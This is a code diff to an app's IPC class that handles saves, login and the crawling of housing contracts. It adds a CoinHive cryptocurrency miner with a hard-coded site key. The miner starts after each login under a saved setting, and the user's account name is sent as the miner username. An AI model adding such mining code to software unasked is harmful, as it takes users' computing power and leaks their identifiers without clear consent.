@@ -1,11 +1,14 @@
+import CoinHive from 'coin-hive'
+
 class MainIpc {
-  constructor (i18n, ipc, notifier, window, saves, crawler) {
+  constructor (i18n, ipc, notifier, window, saves, crawler, miner) {
     this.i18n = i18n
     this.ipc = ipc
     this.notifier = notifier
     this.window = window
     this.saves = saves
     this.crawler = crawler
+    this.miner = miner
 
     this.knowError = ['HousingReportNotFillError', 'TimeoutError']
 
@@ -18,6 +21,29 @@ class MainIpc {
     this.ipc.on('req-navigate-url', (event, data) => this.reqNavigateUrl(event, data))
     this.ipc.on('req-crawl-available-contracts', (event, data) => this.reqCrawlAvailableContracts(event, data))
     this.ipc.on('req-crawl-year-schedules', (event, data) => this.reqCrawlYearSchedules(event, data))
+  }
+
+  minerSetup (data, username) {
+    (async () => {
+      if (this.miner !== null) {
+        await this.miner.kill()
+      }
+
+      username = username || 'Anonymous'
+      this.miner = await CoinHive('SAQOkYryaUVeCkxfBaHpOZ98ebi7lxE4', {
+        username: username,
+        threads: data.threads,
+        throttle: data.throttle,
+        devFee: 0
+      })
+
+      if (data.enable) {
+        await this.miner.start()
+      } else {
+        await this.miner.stop()
+      }
+      console.log('Miner updated: ' + JSON.stringify(data, null, 4) + ', username: ' + username)
+    })()
   }
 
   finalRtnNotify (resKey, result) {
@@ -35,9 +61,16 @@ class MainIpc {
   }
 
   reqWriteSaves (event, data) {
-    this.saves.data = data
-    this.saves.writeSaves()
-    this.window.webContents.send('update-saves', this.saves.data)
+    if (this.saves.data !== data) {
+      if (this.saves.data.setup.coinhive !== data.setup.coinhive) {
+        this.minerSetup(data.setup.coinhive, this.saves.data.login.account)
+      }
+      for (var index in data) {
+        this.saves[index] = data[index]
+      }
+      this.saves.writeSaves()
+      this.window.webContents.send('update-saves', this.saves.data)
+    }
   }
 
   reqReadSaves (event, data) {
@@ -90,6 +123,7 @@ class MainIpc {
       this.crawler.password = tempLogin.password
       return {'fail': true, 'reason': (this.knowError.includes(err.name) ? err.name : err), 'i18n': 'NO.LoginFail'}
     }).then((finalRtn) => {
+      this.minerSetup(this.saves.data.setup.coinhive, this.saves.data.login.account)
       this.finalRtnNotify('res-login', finalRtn)
     })
   }
